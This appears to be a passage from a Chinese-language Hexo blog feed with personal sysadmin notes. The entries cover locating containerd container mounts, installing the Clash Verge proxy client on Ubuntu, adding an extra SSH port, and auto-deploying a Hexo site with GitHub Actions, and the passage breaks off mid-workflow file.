    <link href="/2024/11/22/containerd/%E3%80%90containerd%E3%80%91(202411)%2009.%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%9F%90%E4%B8%AA%E5%AE%B9%E5%99%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9C%A8%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%98%A0%E5%B0%84%EF%BC%9F/"/>
    <url>/2024/11/22/containerd/%E3%80%90containerd%E3%80%91(202411)%2009.%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E6%9F%90%E4%B8%AA%E5%AE%B9%E5%99%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%9C%A8%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%9A%84%E6%98%A0%E5%B0%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">crictl <span class="hljs-keyword">ps</span> 找到第一列的某一个containerID<br>mount |<span class="hljs-keyword">grep</span> <span class="hljs-symbol">&lt;containerID&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241122121642.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241122121256.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241122121326.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】(202411) linux下部署clash</title>
    <link href="/2024/11/20/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202411)%20linux%E4%B8%8B%E9%83%A8%E7%BD%B2clash/"/>
    <url>/2024/11/20/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202411)%20linux%E4%B8%8B%E9%83%A8%E7%BD%B2clash/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@ubuntu-22</span> ~]# uname -a<br>Linux ubuntu<span class="hljs-number">-22</span> <span class="hljs-number">6.8</span>.<span class="hljs-number">0</span><span class="hljs-number">-48</span>-generic <span class="hljs-variable">#48</span>~<span class="hljs-number">22.04</span>.<span class="hljs-number">1</span>-Ubuntu SMP PREEMPT_DYNAMIC Mon Oct  <span class="hljs-number">7</span> <span class="hljs-number">11</span>:<span class="hljs-number">24</span>:<span class="hljs-number">13</span> UTC <span class="hljs-number">2</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> GNU/Linux<br></code></pre></td></tr></table></figure><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>下载地址：<a href="https://clashcn.com/clashreleases">Clash Releases-Clash中文网</a></p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241120235817.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ningan@ubuntu-22:~$ <span class="hljs-built_in">mkdir</span> clash<br>ningan@ubuntu-22:~$ <span class="hljs-built_in">cd</span> clash/<br><br><span class="hljs-comment"># 下载</span><br>ningan@ubuntu-22:~/clash$ wget https://down.clashcn.com/soft/CVR/clashcn.com_clash-verge_1.5.11_amd64.AppImage<br>--2024-11-20 23:37:45--  https://down.clashcn.com/soft/CVR/clashcn.com_clash-verge_1.5.11_amd64.AppImage<br><br><span class="hljs-comment"># 赋权</span><br>ningan@ubuntu-22:~/clash$ <span class="hljs-built_in">chmod</span> 755 clashcn.com_clash-verge_1.5.11_amd64.AppImage <br><br><span class="hljs-comment"># 执行</span><br><span class="hljs-comment"># 执行后会直接弹出一个框</span><br>ningan@ubuntu-22:~/clash$ ./clashcn.com_clash-verge_1.5.11_amd64.AppImage <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241120235943.png" alt="image.png"></p><p>其实到这，其实已经安装好了</p><h1 id="适配之前的配置"><a href="#适配之前的配置" class="headerlink" title="适配之前的配置"></a>适配之前的配置</h1><p>为了适配之前的clash默认端口，将下面这个地方的端口改为7890</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241121000147.png" alt="image.png"></p><p>目前只能看到7890端口在127.0.0.1上面</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@ubuntu</span><span class="hljs-number">-22</span> ~]<span class="hljs-comment"># netstat -nltp |grep 7890</span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">7890</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:*</span>               <span class="hljs-title class_">LISTEN</span>      <span class="hljs-number">124491</span>/clash-meta <br></code></pre></td></tr></table></figure><p>将下面的局域网连接开启，就可以在所有网卡上看到7890端口了</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/20241121000317.png" alt="image.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[root<span class="hljs-variable">@ubuntu</span><span class="hljs-number">-22</span> ~]<span class="hljs-comment"># netstat -nltp |grep 7890</span><br>tcp6       <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-symbol">:</span><span class="hljs-number">7890</span>                 ::<span class="hljs-symbol">:*</span>                    <span class="hljs-title class_">LISTEN</span>      <span class="hljs-number">126325</span>/clash-meta <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202411) ssh加22000端口</title>
    <link href="/2024/11/11/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202411)%20ssh%E5%8A%A022000%E7%AB%AF%E5%8F%A3/"/>
    <url>/2024/11/11/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202411)%20ssh%E5%8A%A022000%E7%AB%AF%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<p>在下面的文件中添加22000端口，然后重启sshd服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># cat /etc/ssh/sshd_config |grep 22</span><br><span class="hljs-comment">#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $</span><br>Port 22<br>Port 22000<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【hexo系列】03.Github Action自动部署hexo</title>
    <link href="/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9103.Github%20Action%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2hexo/"/>
    <url>/2024/11/01/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9103.Github%20Action%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p><a href="https://ningan123.github.io/2022/12/10/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9101.hexo%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8Agithub.io%E6%90%AD%E5%BB%BA/#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">【hexo系列】01.hexo环境搭建及github.io搭建 - ningan123</a><br><a href="https://ningan123.github.io/2022/12/11/hexo/%E3%80%90hexo%E7%B3%BB%E5%88%97%E3%80%9102.hexo%E5%92%8Cobsidian%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0%E4%B8%9D%E6%BB%91/">【hexo系列】02.hexo和obsidian实现笔记丝滑 - ningan123</a></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>1.在上述实现的基础上，每次在本地更新完笔记之后，需要手动执行<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>推送到<code>github.io</code>网站（Github Pages）。<br>2.推送过去之后访问<code>ningan123.github.io</code>的时候，并不能马上看到更新的内容。</p><h1 id="Github-Actions介绍"><a href="#Github-Actions介绍" class="headerlink" title="Github Actions介绍"></a>Github Actions介绍</h1><p>GitHub Actions 是 GitHub 推出的一项强大的自动化工具，它允许用户在 GitHub 仓库中创建、编辑和运行自动化脚本，这些脚本被称为工作流程（workflows）。这些工作流程可以响应 GitHub 上的各种事件，例如代码被推送、issue 被创建、pull request 被打开或定期调度任务等。</p><p>GitHub Actions 的工作流程（workflow）由 YAML 文件定义，这些文件放在仓库的 <code>.github/workflows</code> 目录下。每个工作流程文件描述了一系列的作业（jobs）和步骤（steps），定义了运行环境、触发条件、要执行的任务等。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>本地存在一个存放hexo博客的文件夹<br>github.io已经搭建</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1-新建私有仓库（自动化仓库）"><a href="#1-新建私有仓库（自动化仓库）" class="headerlink" title="1. 新建私有仓库（自动化仓库）"></a>1. 新建私有仓库（自动化仓库）</h2><p>先建一个私有仓库（blog），这个仓库存放的是编译前的文件，也就是你电脑本地的文件，这个仓库是拿来做自动化的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102133157.png" alt="image.png"></p><p><strong>目前github上一共两个仓库</strong></p><ul><li>一个公有仓库存编译好的hexo（pages仓库，仓库名是<code>ningan123.github.io</code>）</li><li>一个私有仓库存<strong>本地电脑编译前</strong>的文件（自动化仓库，仓库名是<code>blog</code>）</li></ul><h2 id="2-绑定本地文件夹到github的私有仓库blog"><a href="#2-绑定本地文件夹到github的私有仓库blog" class="headerlink" title="2.绑定本地文件夹到github的私有仓库blog"></a>2.绑定本地文件夹到github的私有仓库blog</h2><h3 id="先查看本地的文件夹是否已经被git管理"><a href="#先查看本地的文件夹是否已经被git管理" class="headerlink" title="先查看本地的文件夹是否已经被git管理"></a>先查看本地的文件夹是否已经被git管理</h3><p>方法1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS E:\SynologyDrive\blog&gt; git remote -v<br>fatal: not a git repository (or any of the parent directories): .git<br>PS E:\SynologyDrive\blog&gt; <br></code></pre></td></tr></table></figure><p>方法2：<br>查看文件夹根目录下是否有.git文件夹，如果有，需要删除</p><h3 id="文件夹根目录下添加-gitignore文件"><a href="#文件夹根目录下添加-gitignore文件" class="headerlink" title="文件夹根目录下添加.gitignore文件"></a>文件夹根目录下添加<code>.gitignore</code>文件</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">.DS_Store<br>Thumbs.db<br>db.json<br>*.log<br>node_modules/<br><span class="hljs-keyword">public</span>/<br>.deploy*/<br>.deploy_git*/<br>.idea<br>themes<span class="hljs-regexp">/butterfly/</span>.git<br>themes<span class="hljs-regexp">/3-hexo/</span>.git<br>themes<span class="hljs-regexp">/landscape/</span>.git<br>themes<span class="hljs-regexp">/fluid/</span>.git<br></code></pre></td></tr></table></figure><p>如果你的主题不是butterfly，那么最后一行请改为你使用的主题<br>我把我涉及到的几个主题都写上了</p><h3 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">git init  <span class="hljs-comment">#把这个目录变成Git可以管理的仓库</span><br><br><span class="hljs-comment"># 可选 begin</span><br><span class="hljs-comment"># 设置本仓库的用户名和邮箱</span><br>git config user.name ningan123<br>git config user.email xxx<br><span class="hljs-comment"># 可选 end</span><br><br>git add .   <span class="hljs-comment">#添加当前目录文件到缓存区（别漏命令后面的点）</span><br>git commit -m <span class="hljs-string">&quot;first commit&quot;</span>  <span class="hljs-comment">#提交缓存区内容到本地库，并备注first commit</span><br><br><span class="hljs-comment">#下面两条命令二选一，就行了</span><br>git remote add origin https://github.com/用户名/自动化仓库名.git   <span class="hljs-comment">#利用https关联远程仓库</span><br>git remote add origin git@github.com:用户名/自动化仓库名.git   <span class="hljs-comment">#利用ssh关联远程仓库</span><br><br>git remote add origin git@github.com:ningan123/blog.git<br><br>git push -u origin master  <span class="hljs-comment">#把本地库的所有内容推送到远程库上</span><br>git branch --set-upstream-to=origin/master master<br>git pull  <span class="hljs-comment"># 如果报错，fatal: refusing to merge unrelated histories，执行：git pull --allow-unrelated-histories</span><br><br></code></pre></td></tr></table></figure><h2 id="3-获取-Github-token"><a href="#3-获取-Github-token" class="headerlink" title="3.获取 Github token"></a>3.获取 Github token</h2><p><a href="https://github.com/settings/tokens">Personal Access Tokens (Classic)</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102141503.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102141550.png" alt="image.png"></p><p>生成的token保存好，只会出现这一次，我之前已经生成过了，就不生成了</p><h2 id="4-设置私有仓库的secret"><a href="#4-设置私有仓库的secret" class="headerlink" title="4.设置私有仓库的secret"></a>4.设置私有仓库的secret</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102141922.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102142203.png" alt="image.png"></p><h2 id="5-设置workflow"><a href="#5-设置workflow" class="headerlink" title="5.设置workflow"></a>5.设置workflow</h2><p>在本地博客文件夹.github&#x2F;workflows&#x2F;下新建autodeploy.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">自动部署</span><br><br><span class="hljs-comment"># 当有改动推送到master分支时，启动Action</span><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span> <span class="hljs-comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span><br>  <span class="hljs-attr">release:</span><br>    <span class="hljs-attr">types:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">published</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">deploy:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span> <span class="hljs-comment"># 任务所需容器，可选值：ubuntu-latest、windows-latest、macos-latest</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">检查分支</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">ref:</span> <span class="hljs-string">master</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装</span> <span class="hljs-string">Node</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">&quot;16.x&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string">          npm install hexo-cli -g</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">缓存</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-string">cache-npm</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/cache@v3</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">cache-name:</span> <span class="hljs-string">cache-node-modules</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">node_modules</span><br>          <span class="hljs-attr">key:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">runner.os</span> <span class="hljs-string">&#125;&#125;-build-$&#123;&#123;</span> <span class="hljs-string">env.cache-name</span> <span class="hljs-string">&#125;&#125;-$&#123;&#123;</span> <span class="hljs-string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="hljs-string">&#125;&#125;</span><br>          <span class="hljs-attr">restore-keys:</span> <span class="hljs-string">|</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装依赖</span><br>        <span class="hljs-attr">if:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">steps.cache-npm.outputs.cache-hit</span> <span class="hljs-type">!=</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install gulp-cli -g #全局安装gulp</span><br><span class="hljs-string">          npm install --save</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">生成静态文件</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo bangumi -u #bilibili番剧更新</span><br><span class="hljs-string">          hexo generate</span><br><span class="hljs-string"></span>          <br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">部署到Github</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@v4</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">token:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.GITHUBTOKEN</span> <span class="hljs-string">&#125;&#125;</span><br>          <span class="hljs-attr">repository-name:</span> <span class="hljs-string">ningan123/ningan123.github.io</span><br>          <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br>          <span class="hljs-attr">folder:</span> <span class="hljs-string">public</span><br>          <span class="hljs-attr">commit-message:</span> <span class="hljs-string">&quot;$<span class="hljs-template-variable">&#123;&#123; github.event.head_commit.message &#125;&#125;</span> $(date +\&quot;%Z %Y-%m-%d %A %H:%M:%S\&quot;) Updated By Github Actions&quot;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">git <span class="hljs-keyword">add</span> .\.github\workflows\autodeply.yaml<br>git commit -m <span class="hljs-string">&quot;add autodeply&quot;</span><br>git <span class="hljs-keyword">push</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20241102143921.png" alt="image.png"></p><p>重新生成了token也不好使，后来换了一个autodeploy.yml，成功执行了，如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">自动部署</span><br><br><span class="hljs-comment"># 当有改动推送到master分支时，启动Action</span><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span> <span class="hljs-comment">#2020年10月后github新建仓库默认分支改为main，注意更改</span><br>  <span class="hljs-attr">release:</span><br>    <span class="hljs-attr">types:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">published</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">deploy:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span> <span class="hljs-comment"># 任务所需容器，可选值：ubuntu-latest、windows-latest、macos-latest</span><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">检查分支</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">ref:</span> <span class="hljs-string">master</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装</span> <span class="hljs-string">Node</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">&quot;16.x&quot;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ=&#x27;Asia/Shanghai&#x27;</span><br><span class="hljs-string">          npm install hexo-cli -g</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">缓存</span> <span class="hljs-string">Hexo</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-string">cache-npm</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/cache@v3</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">cache-name:</span> <span class="hljs-string">cache-node-modules</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">path:</span> <span class="hljs-string">node_modules</span><br>          <span class="hljs-attr">key:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">runner.os</span> <span class="hljs-string">&#125;&#125;-build-$&#123;&#123;</span> <span class="hljs-string">env.cache-name</span> <span class="hljs-string">&#125;&#125;-$&#123;&#123;</span> <span class="hljs-string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="hljs-string">&#125;&#125;</span><br>          <span class="hljs-attr">restore-keys:</span> <span class="hljs-string">|</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-$&#123;&#123; env.cache-name &#125;&#125;-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-build-</span><br><span class="hljs-string">            $&#123;&#123; runner.os &#125;&#125;-</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装依赖</span><br>        <span class="hljs-attr">if:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">steps.cache-npm.outputs.cache-hit</span> <span class="hljs-type">!=</span> <span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-string">&#125;&#125;</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install gulp-cli -g #全局安装gulp</span><br><span class="hljs-string">          npm install --save</span><br><span class="hljs-string"></span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">生成静态文件</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          hexo clean</span><br><span class="hljs-string">          hexo bangumi -u #bilibili番剧更新</span><br><span class="hljs-string">          hexo generate</span><br><span class="hljs-string"></span>          <br><br>      <span class="hljs-comment"># - name: 部署到Github</span><br>      <span class="hljs-comment">#   uses: JamesIves/github-pages-deploy-action@v4</span><br>      <span class="hljs-comment">#   with:</span><br>      <span class="hljs-comment">#     token: $&#123;&#123; secrets.GITHUBTOKEN &#125;&#125;</span><br>      <span class="hljs-comment">#     repository-name: ningan123/ningan123.github.io</span><br>      <span class="hljs-comment">#     branch: main</span><br>      <span class="hljs-comment">#     folder: public</span><br>      <span class="hljs-comment">#     commit-message: &quot;$&#123;&#123; github.event.head_commit.message &#125;&#125; $(date +\&quot;%Z %Y-%m-%d %A %H:%M:%S\&quot;) Updated By Github Actions&quot;</span><br><br><br>      <span class="hljs-comment"># - name: Build and Deploy</span><br>      <span class="hljs-comment">#   # 使用专门部署 Hexo 到 GitHub pages 的 action</span><br>      <span class="hljs-comment">#   uses: 